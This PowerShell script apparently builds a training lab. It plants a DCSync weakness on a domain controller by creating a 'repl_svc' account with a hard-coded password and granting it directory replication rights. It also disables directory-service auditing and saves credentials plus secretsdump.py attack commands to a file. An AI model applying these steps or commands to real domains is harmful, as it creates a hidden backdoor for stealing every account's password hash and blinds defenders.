﻿# vuln: dcsync | severity: critical
# Grants DS-Replication-Get-Changes-All rights to repl_svc account
# Attack: secretsdump.py cyberstrike.mil/repl_svc:Repl1cate!@10.0.20.101
# Requires: AD DS, Run on ADDC

Write-Host "[VULN] Injecting DCSync vulnerability..."

Import-Module ActiveDirectory -ErrorAction Stop

$domain = "cyberstrike.mil"
$dcDN   = "DC=cyberstrike,DC=mil"

# ── Create repl_svc account ───────────────────────────────────────────────────
try {
    if (-not (Get-ADUser -Filter {SamAccountName -eq "repl_svc"} -ErrorAction SilentlyContinue)) {
        New-ADUser `
            -Name "Replication Service" `
            -SamAccountName "repl_svc" `
            -UserPrincipalName "repl_svc@cyberstrike.mil" `
            -AccountPassword (ConvertTo-SecureString "Repl1cate!" -AsPlainText -Force) `
            -Enabled $true `
            -PasswordNeverExpires $true
        Write-Host "[+] Created user: repl_svc"
    } else {
        Write-Host "[+] repl_svc already exists"
    }
} catch {
    Write-Host "[!] Failed to create repl_svc: $($_.Exception.Message)"
}

# ── Grant DCSync rights ───────────────────────────────────────────────────────
try {
    $replSvc = Get-ADUser -Identity "repl_svc"
    $sid     = New-Object System.Security.Principal.SecurityIdentifier($replSvc.SID)

    # DS-Replication-Get-Changes
    $guidGetChanges    = New-Object Guid "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
    # DS-Replication-Get-Changes-All
    $guidGetChangesAll = New-Object Guid "1131f6ab-9c07-11d1-f79f-00c04fc2dcd2"

    $domainDN  = "AD:\$dcDN"
    $acl       = Get-Acl $domainDN

    $aceGetChanges = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $sid,
        [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
        [System.Security.AccessControl.AccessControlType]::Allow,
        $guidGetChanges,
        [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
    )
    $aceGetChangesAll = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $sid,
        [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
        [System.Security.AccessControl.AccessControlType]::Allow,
        $guidGetChangesAll,
        [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
    )

    $acl.AddAccessRule($aceGetChanges)
    $acl.AddAccessRule($aceGetChangesAll)
    Set-Acl -Path $domainDN -AclObject $acl

    Write-Host "[+] DCSync rights granted to repl_svc"
} catch {
    Write-Host "[!] Failed to grant DCSync rights: $($_.Exception.Message)"
}

# ── Disable directory service auditing ───────────────────────────────────────
try {
    auditpol /set /subcategory:"Directory Service Access" /success:disable /failure:disable 2>$null
    auditpol /set /subcategory:"Directory Service Changes" /success:disable /failure:disable 2>$null
    Write-Host "[+] Directory service auditing disabled"
} catch {
    Write-Host "[!] Could not modify audit policy: $($_.Exception.Message)"
}

# ── Write info file ───────────────────────────────────────────────────────────
New-Item -Path "C:\Temp" -ItemType Directory -Force | Out-Null
@"
DCSync Vulnerability Injected
Account : repl_svc
Password: Repl1cate!
Rights  : DS-Replication-Get-Changes-All

Attack command:
secretsdump.py cyberstrike.mil/repl_svc:Repl1cate!@10.0.20.101
secretsdump.py cyberstrike.mil/repl_svc:Repl1cate!@10.0.20.101 -just-dc-user Administrator
"@ | Out-File "C:\Temp\dcsync_info.txt" -Encoding UTF8

Write-Host "[VULN] DCSync injection complete."